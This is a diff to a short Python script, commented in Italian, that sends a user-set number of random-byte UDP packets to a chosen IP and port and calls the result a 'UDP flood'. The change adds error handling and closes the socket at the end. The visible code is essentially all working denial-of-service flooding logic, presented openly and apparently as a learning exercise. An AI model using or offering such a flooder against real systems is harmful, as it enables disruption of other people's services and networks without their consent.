@@ -26,8 +26,17 @@ randomBytes = randbytes(dimPacchetti)                                           
 
 print(f"Sto inviando {numPacchetti} pacchetti UDP di dimensione {dimPacchetti} bytes all'indirizzo: {ipTarget}:{portaTarget} \n")
 
-for i in range(numPacchetti):
-    s.sendto(randomBytes, (ipTarget, portaTarget))                                       #ciclo for che mi invia i pacchetti fino al numero inserito dall'utente
-    print(f"Pacchetto {i+1} inviato")
+try:
 
-print("UDP flood completato")                                                            #fine
+    for i in range(numPacchetti):
+        s.sendto(randomBytes, (ipTarget, portaTarget))                                       #ciclo for che mi invia i pacchetti fino al numero inserito dall'utente
+        print(f"Pacchetto {i+1} inviato")
+
+    print("UDP flood completato")  
+    
+except Exception as e:
+    print(f"Si è verificato un errore: {e}")
+    
+
+s.close()
+print("Connessione chiusa")
